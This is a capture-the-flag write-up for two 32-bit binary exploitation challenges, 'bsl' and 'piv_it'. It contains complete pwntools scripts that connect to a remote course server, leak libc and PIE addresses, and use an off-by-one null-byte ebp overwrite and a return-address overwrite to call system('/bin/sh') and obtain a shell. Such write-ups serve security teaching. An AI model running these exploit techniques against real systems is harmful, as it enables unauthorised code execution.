# bsl

Flag: FLAG{eyJhbGciOiJIUzI1NiJ9.eyJjaGFsIjoid2FyOC1ic2wiLCJpcCI6IjIwMi44Ny4xNjIuMjgiLCJzZXNzaW9uIjoiMDA2OWFiNTAtOTU4YS00ZWFjLTgyNDMtMDJkOTQ1MmYwNjQ5In0.pdZiMs7HAYfVZ6KNNLmlKujF-jiz4BRqRTZ1DNfQYPk}

## Scenario

The two `fgets` functions do not have a very large buffer space. And they won't overflow much.  
The `fgets` function in `least_fav` does seem to read in one too many bytes...

## Solution

By sending the maximum input size for the `least_fav::fgets` function, by nature of how `fgets` works, it writes an 0x00 into the last space.  
This space happens to be the LSB of the saved `ebp` value.  
When the function returns, the returning `fav` function now has a modified ebp at a lower address, which allows `most_fav::fgets` to become an opening for overflowing the stack frame for itself. This allows us to overwrite the EBP.

## Script

```python3
#!/usr/bin/python3

'''
Arch:     i386-32-little
RELRO:    Full RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      PIE enabled
'''

from pwn import *

# p = process("./bsl")
p = remote("plsdonthaq.me", 8001)

'''
:: most_fav
send - 0
fgets(arg1, 0x538, stdin) # Can't overwrite EBP in the current stack frame, but can in the parent frame!

:: least fav
LEAK: get_number
fgets(esp-0xd4, 0xd1, stdin) # Not enough!
'''

addr = dict()
offsets = dict(
    get_number = 0x713,
    puts=0x67b40,
    system=0x3d200,
    binsh=0x17e0cf,
    ret=0x4a6
)


p.sendlineafter("Will you be my friend? (y/n)", "y")
p.recvuntil("My current favourite is: ")
addr["libc_base"] = int(p.recvline(), 16) - offsets["puts"]
log.info(f"Got libc base leak :: {hex(addr['libc_base'])}")

# Fav number 1
p.sendline("y")
p.sendline("0")
p.sendline("")


# Least number
p.sendline("y")
p.recvuntil("Mine is: ")
addr["base"] = int(p.recvline(), 16) - offsets["get_number"]
log.info(f"Got base leak :: {hex(addr['base'])}")

p.sendline("0")
payload = b''
payload += b'.' * (0xd1-5)
ebx = addr["base"] + 0x2fb4 # Keep the value of ebx
payload += p32(ebx)
p.sendline(payload)
# Zero the LSB byte of ebp

# Spill fix, least fav
p.sendline("y")
p.sendline("0")
p.sendline("")

p.sendline("y")
p.sendline("0")

# Sometimes Santa doesn't give us our system(/bin/sh) present
# Probably needs some more RETs
payload = b'A'
payload += p32(addr["base"] + offsets["ret"]) * 0x120
payload += p32(addr["libc_base"] + offsets["system"])
payload += b'....'
payload += p32(addr["libc_base"] + offsets["binsh"])

p.sendline(payload)

''' 

fgets(ebp-0xd0, 0xd1)

|ebp+0x4|EIP
|ebp    | saved ebp
|ebp-0x4|ebx

'''

p.interactive()
```

# piv_it

Flag: FLAG{eyJhbGciOiJIUzI1NiJ9.eyJjaGFsIjoid2FyOC1waXZfaXQiLCJpcCI6IjIwMi44Ny4xNjIuMjgiLCJzZXNzaW9uIjoiZWQ4ZjY3MzgtZjY1NC00YjY2LTgzN2EtOWE5ZmI1OTJhNmI0In0.eu74bIYNIrKTXcZ8ACMZr8GfaSad-de1bmuJ7cLlbpA}

## Scenario

Possible stack pivot, given the small buffer space from the vulnerable `read` call.

## Solution

Jokes! :trivial:  

Using the printf leak, we can find the address of the libc base.  
We can then find the addresses of `system` and the `/bin/sh` string, and overwrite the return address to system.

## Script

```python3
#!/usr/bin/python3

'''
Arch:     i386-32-little
RELRO:    Full RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      PIE enabled
'''

from pwn import *

# p = process("./piv_it")
p = remote("plsdonthaq.me", 8002)

addr = dict()
offsets = dict(
    printf = 0x512d0,
    system = 0x3d200,
    main = 0x725,
    binsh = 0x17e0cf
)

# '''
# 1) read(0, &var_a8, 0x80)
# 2) read(0, &var_20, 0x38)
# '''

# Leak libc base
p.recvuntil("Unexpected Error Encountered At: ")
addr["libc_base"] = int(p.recvline(), 16) - offsets["printf"]
log.info(f"libc base leaked at {hex(addr['libc_base'])}")

# Send payload
p.sendlineafter("Manual Override Initiated\n\n$ ", "")

# Leak program base
p.recvuntil("Unexpected Error Encountered At: ")
addr["base"] = int(p.recvline(), 16) - offsets["main"]
log.info(f"Program base leaked at {hex(addr['base'])}")

# 0x38 
payload = b''
payload += b'\00' * 0x20
payload += p32(addr['libc_base'] + offsets["system"]) 
payload += b'....'
payload += p32(addr['libc_base'] + offsets["binsh"])
p.sendlineafter("Safe Mode Enabled\n\n$ ", payload)

p.recvuntil("Failed to execute command: ")
log.critical("PWN!")
p.interactive()
```